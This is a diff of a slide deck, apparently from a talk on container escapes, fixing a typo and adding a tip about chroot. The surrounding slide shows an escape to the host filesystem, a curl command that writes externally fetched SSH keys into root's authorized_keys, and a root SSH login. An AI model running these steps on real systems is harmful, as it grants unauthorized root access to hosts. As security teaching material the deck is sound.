@@ -310,9 +310,10 @@ cd /host/root                          # Enter the *host's* filesystem
 # Add your keys to the root login
 curl https://github.com/allanbreyes.keys &gt; ./.ssh/authorized_keys
 </code></pre>
-<p>Remotely enter hsot as root:</p>
+<p>Remotely enter host as root:</p>
 <pre is="marp-pre" data-auto-scaling="downscale-only"><code>ssh root@1.2.3.4
 </code></pre>
+<p>Even easier: run <code>chroot</code>! (Remember those capabilities? <code>CAP_SYS_CHROOT</code>!)</p>
 </section>
 </foreignObject></svg><svg data-marpit-svg="" viewBox="0 0 1280 720"><foreignObject width="1280" height="720"><section id="22" data-paginate="true" data-marpit-pagination="22" data-marpit-pagination-total="27" style="--paginate:true;">
 <h1>Let's tear down a Dockerfile...</h1>
